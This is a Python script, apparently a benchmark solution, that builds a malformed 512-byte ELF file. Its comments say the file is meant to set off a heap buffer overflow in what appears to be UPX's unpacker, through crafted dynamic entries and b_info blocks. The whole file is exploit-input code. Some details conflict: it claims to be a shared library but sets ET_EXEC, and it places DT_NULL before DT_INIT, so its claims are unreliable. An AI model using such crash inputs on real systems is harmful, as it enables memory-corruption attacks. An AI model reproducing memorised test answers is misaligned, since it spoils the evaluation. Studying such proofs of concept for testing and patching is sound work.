import os
import struct
import subprocess
import tempfile
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF shared library with specific characteristics
        # that trigger the heap buffer overflow vulnerability
        
        # ELF header (64-bit)
        elf_header = bytearray([
            0x7f, 0x45, 0x4c, 0x46,  # ELF magic
            0x02,  # 64-bit
            0x01,  # Little endian
            0x01,  # ELF version
            0x03,  # Linux ABI
            0x00,  # ABI version
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Padding
            0x02, 0x00,  # ET_EXEC
            0x3e, 0x00,  # x86-64
            0x01, 0x00, 0x00, 0x00,  # ELF version
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Entry point
            0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Program header offset
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Section header offset
            0x00, 0x00, 0x00, 0x00,  # Flags
            0x40, 0x00,  # ELF header size
            0x38, 0x00,  # Program header entry size
            0x02, 0x00,  # Number of program headers
            0x40, 0x00,  # Section header entry size
            0x00, 0x00,  # Number of section headers
            0x00, 0x00  # Section header string table index
        ])
        
        # First program header (PT_LOAD with specific flags)
        phdr1 = bytearray([
            0x01, 0x00, 0x00, 0x00,  # PT_LOAD
            0x05, 0x00, 0x00, 0x00,  # Flags: R+X
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Memory size
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # Alignment
        ])
        
        # Second program header (PT_DYNAMIC with specific characteristics)
        # This is crafted to trigger the vulnerability
        phdr2 = bytearray([
            0x02, 0x00, 0x00, 0x00,  # PT_DYNAMIC
            0x06, 0x00, 0x00, 0x00,  # Flags: R+W
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Memory size
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # Alignment
        ])
        
        # Build the ELF file
        elf_data = bytearray()
        elf_data.extend(elf_header)
        elf_data.extend(phdr1)
        elf_data.extend(phdr2)
        
        # Add dynamic section data that will cause issues during decompression
        # This includes DT_INIT and DT_FINI entries that will trigger un_DT_INIT()
        dynamic_section = bytearray()
        
        # DT_NULL entry
        dynamic_section.extend(struct.pack('<QQ', 0, 0))
        
        # DT_INIT entry - points to memory that will cause overflow
        dynamic_section.extend(struct.pack('<QQ', 12, 0x1000))
        
        # DT_FINI entry
        dynamic_section.extend(struct.pack('<QQ', 13, 0x1000))
        
        # Add more dynamic entries to fill space
        for i in range(20):
            dynamic_section.extend(struct.pack('<QQ', i + 20, 0x1000 + i * 8))
        
        # Add the dynamic section to the ELF data
        elf_data.extend(dynamic_section)
        
        # Pad to 512 bytes with pattern that will trigger the heap overflow
        # when processed by the vulnerable decompressor
        current_len = len(elf_data)
        if current_len < 512:
            # Create a pattern that will cause issues in lowmem[0, +xct_off)
            # and trigger the ph.method reset bug
            pattern = bytearray()
            
            # Add b_info blocks with problematic b_method values
            for i in range((512 - current_len) // 12):
                # b_info structure
                pattern.extend(struct.pack('<I', 0x100))  # sz_unc
                pattern.extend(struct.pack('<I', 0x50))   # sz_cpr
                pattern.extend(struct.pack('<B', 0x02))   # b_method
                pattern.extend(struct.pack('<B', 0x00))   # b_ftid
                pattern.extend(struct.pack('<B', 0x00))   # b_cto8
                pattern.extend(struct.pack('<B', 0x00))   # unused
            
            # Fill remaining bytes
            remaining = 512 - current_len - len(pattern)
            if remaining > 0:
                pattern.extend(b'\xCC' * remaining)
            
            elf_data.extend(pattern)
        
        # Ensure exactly 512 bytes
        elf_data = elf_data[:512]
        
        # Verify the structure is valid enough to trigger the vulnerability
        if len(elf_data) < 512:
            elf_data.extend(b'\x00' * (512 - len(elf_data)))
        
        return bytes(elf_data)
